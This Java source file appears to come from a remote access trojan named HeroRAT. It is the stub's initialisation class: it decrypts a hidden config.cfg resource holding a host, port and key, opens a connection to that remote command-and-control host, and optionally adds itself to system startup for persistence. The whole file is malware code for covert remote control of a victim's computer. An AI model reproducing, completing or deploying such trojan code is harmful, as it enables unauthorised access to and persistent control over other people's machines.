package net.herorat.features.create;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import net.herorat.features.startup.Startup;
import net.herorat.network.Network;
import net.herorat.utils.Crypto;


public class Create
{
	public static void init()
	{
		try
		{
			BufferedReader reader = new BufferedReader(new InputStreamReader(Create.class.getResourceAsStream("/config.cfg")));
			String line = reader.readLine();
			if (line != null)
			{
				line = new String( Crypto.decrypt(Crypto.hexToByte(line)) );
				String[] config_data = line.split("###");
				if (config_data.length >= 3)
				{				
					// Connection
					Network network = new Network(config_data[0], Integer.parseInt(config_data[2]), config_data[1]);
					network.start();
					
					// Startup
					if (config_data.length == 4)
					{
						Startup.add(config_data[3]);
					}
					
					return;
				}
			}
		}
		catch (Exception e) {e.printStackTrace();}
		
		System.out.println("An error occured while reading the config file !");
	}
}